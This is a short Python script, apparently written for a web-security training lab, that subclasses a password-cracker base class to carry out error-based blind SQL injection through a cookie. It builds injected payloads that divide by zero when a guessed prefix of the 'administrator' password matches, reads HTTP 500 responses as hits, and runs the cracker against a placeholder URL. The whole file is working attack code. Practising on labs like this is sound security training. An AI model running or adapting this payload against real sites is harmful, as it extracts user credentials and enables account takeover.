from base_password_cracker_class import BasePasswordCracker

class ConditionalErrorLab(BasePasswordCracker):
    def build_cookie_exact_match(self):
        return f"'||(select 1/0 from users where username='administrator' and password = '{self.password}')||'"

    def build_cookie_guess_password(self, character):
        return f"'||(select 1/0 from users where username='administrator' and password like '{self.password + character}%25')||'"

    def password_exists(self, response):
        return response.status_code == 500
    
if __name__ == "__main__":
    # Adapt url
    url = "https://example.com/" 
    cracker = ConditionalErrorLab(url)
    cracker.crack_password()